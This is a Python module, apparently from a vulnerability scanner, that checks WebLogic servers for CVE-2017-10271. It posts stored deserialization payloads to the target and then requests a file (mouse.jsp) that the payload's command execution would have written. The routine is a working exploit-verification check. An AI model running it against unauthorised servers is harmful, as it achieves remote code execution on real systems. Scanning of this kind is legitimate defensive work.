#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests
from time import sleep

def cve_2017_10271_scan(self, url):
    ''' Weblogic 'wls-wsat' XMLDecoder 反序列化漏洞
            < 10.3.6
            Weblogic的WLS Security组件对外提供webservice服务, 其中使用了XMLDecoder来解析用户传入的XML数据, 在解析的过程中出现反序列化漏洞, 导致可执行任意命令
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'unSerialization'
    vul_info['vul_id'] = 'CVE-2017-10271'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'Content-Type': 'text/xml'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2017_10271_payloads:    # * Payload
        path = payload['path']                      # * Path
        data = payload['data']                      # * Data
        target = url + path                         # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers, 
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (res.status_code == 500):
                sleep(3)                                        # * 延时, 因为命令执行生成文件可能有延迟, 要等一会判断结果才准确
                verify_url = url + 'wls-wsat/mouse.jsp'
                verify_res = requests.get(
                        verify_url, 
                        timeout=self.timeout, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                logger.logging(vul_info, verify_res.status_code, verify_res)

                if ((verify_res.status_code == 200) and ('CVE/2017/10271' in verify_res.text)):
                    results = {
                        'Target': verify_url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Payload': res
                    }
                    return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
